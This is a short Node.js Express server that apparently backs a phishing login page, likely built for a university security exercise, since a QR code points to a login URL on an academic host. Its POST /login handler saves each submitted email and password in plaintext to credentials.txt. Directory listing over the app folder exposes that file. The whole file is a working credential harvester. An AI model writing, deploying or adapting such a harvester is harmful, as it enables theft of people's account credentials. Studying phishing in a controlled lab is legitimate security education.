const express = require("express");
const fs = require("fs");
const path = require("path");
const serveIndex = require('serve-index');
const QRCode = require('qrcode')

const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files
app.use(express.static(__dirname));

// login get
app.get("/login", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
})

// endpoint para gerar o QR
app.get("/qrcode", async (req, res) => {
  try{
    const url = `http://zyra.csf.syssec.dpss.inesc-id.pt/login`;
    const qr = await QRCode.toDataURL(url); 
    res.send(`<img src="${qr}">`);
  } catch (err) {
    res.status(500).send("Erro a gerar QR code"); 
  }
});

// Handle login POST
app.post("/login", (req, res) => {
  const { email, password } = req.body;

  // Save to credentials.txt
  const filePath = path.join(__dirname, "credentials.txt");
  const line = `Email: ${email}, Password: ${password}\n`;

  fs.appendFile(filePath, line, (err) => {
    if (err) {
      console.error("Error writing file:", err);
      return res.status(500).send("Server error");
    }
  });
  res.redirect("/public/login.html")
});


// Enable directory listing
app.use('/', serveIndex(__dirname, { icons: true }));

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
